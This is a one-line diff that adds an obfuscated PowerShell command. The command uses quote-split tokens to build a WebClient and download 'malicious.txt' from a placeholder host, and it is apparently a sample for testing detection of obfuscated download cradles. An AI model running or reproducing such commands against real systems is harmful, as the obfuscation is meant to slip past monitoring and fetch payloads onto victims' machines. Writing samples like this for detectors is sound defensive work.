@@ -1,0 +1,1 @@
+powershell.exe -C (N"e"w-Object     System."Net".Web"cli"ent)."Download"File(remote.url/malicious.txt, output.txt)
